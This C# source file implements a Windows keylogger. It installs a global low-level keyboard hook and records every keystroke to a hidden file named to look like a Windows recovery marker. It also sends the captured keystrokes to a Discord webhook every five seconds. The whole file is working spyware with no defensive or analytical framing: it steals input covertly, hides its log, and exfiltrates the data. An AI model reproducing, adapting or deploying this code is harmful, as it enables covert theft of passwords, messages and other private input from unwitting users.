using KeyLoggerApp;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

public class KeyLogger
{
    private DiscordWebhookSender discordSender;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private LowLevelKeyboardProc _proc;
    private IntPtr _hookID = IntPtr.Zero;
    private string PATH = "C:\\Users\\" + Environment.UserName + "\\AppData\\$WINRE_BACKUP_PARTITION.MARKER2";
    private StringBuilder buffer = new StringBuilder();
    private DateTime lastKeyPressTime = DateTime.MinValue;
    private System.Timers.Timer timer;

    public KeyLogger()
    {
        discordSender = new DiscordWebhookSender();
        _proc = HookCallback;

        timer = new System.Timers.Timer(5000);
        timer.Elapsed += TimerElapsed;
        timer.AutoReset = false;
    }

    public void StartLogging()
    {
        _hookID = SetHook(_proc);
    }

    public void StopLogging()
    {
        UnhookWindowsHookEx(_hookID);
        timer.Stop();
    }

    private void TimerElapsed(object sender, ElapsedEventArgs e)
    {
        SendDiscordMessageAsync(buffer.ToString()).Wait();
        buffer.Clear();
        timer.Stop();
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;

            if (vkCode == 32)
            {
                buffer.Append(" [" + (Keys)vkCode + "] ");
            }
            else if (vkCode >= 65 && vkCode <= 90 && !CapsLock)
            {
                buffer.Append(Convert.ToChar(vkCode + 32));
            }
            else
            {
                buffer.Append((Keys)vkCode);
            }
            lastKeyPressTime = DateTime.Now;

            if (!timer.Enabled)
            {
                timer.Start();
            }


            if (!File.Exists(PATH))
            {
                using (FileStream fs = File.Create(PATH))
                {
                    File.SetAttributes(PATH, File.GetAttributes(PATH) | FileAttributes.Hidden);
                }
            }

            if (File.Exists(PATH))
            {
                using (StreamWriter sw = new StreamWriter(PATH, true))
                {
                    if (vkCode == 32)
                    {
                        sw.Write(" [" + (Keys)vkCode + "] ");
                        sw.Flush();
                    }
                    else if (vkCode >= 65 && vkCode <= 90 && !CapsLock)
                    {
                        sw.Write(Convert.ToChar(vkCode + 32));
                        sw.Flush();
                    }
                    else
                    {
                        sw.Write((Keys)vkCode);
                        sw.Flush();
                    }
                }
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private async Task SendDiscordMessageAsync(string message)
    {
        try
        {
            await discordSender.SendMessageAsync(message);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erreur lors de l'envoi du message Discord : {ex.Message}");
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
    public static extern short GetKeyState(int keyCode);
}
